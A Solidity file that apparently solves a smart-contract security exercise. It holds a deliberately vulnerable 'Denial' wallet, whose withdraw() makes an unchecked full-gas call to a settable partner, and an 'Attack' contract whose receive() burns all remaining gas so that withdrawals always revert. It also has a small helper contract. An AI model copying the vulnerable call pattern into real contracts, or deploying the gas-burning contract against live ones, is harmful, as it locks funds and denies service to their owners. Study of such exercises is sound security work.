//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xd9145CCE52D386f254917e481eB44e9943F39138);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }

    function getEth () public payable {}
}

contract Attack {
  uint256 public i;

  function kek() public { 
    while (gasleft()>0){
      i++;
    }
  }

  receive() external payable {
    kek();
  }
}

contract Owner {
  function withdraw(address _addr) public { 
    IDenial(payable(_addr)).withdraw();
  }  

  function getEth () public payable {}

  function contractBalance() public view returns (uint) {
    return address(this).balance;
  }

  receive() external payable {}
  fallback() external payable {}
}

interface IDenial {
  function withdraw() external;
}


















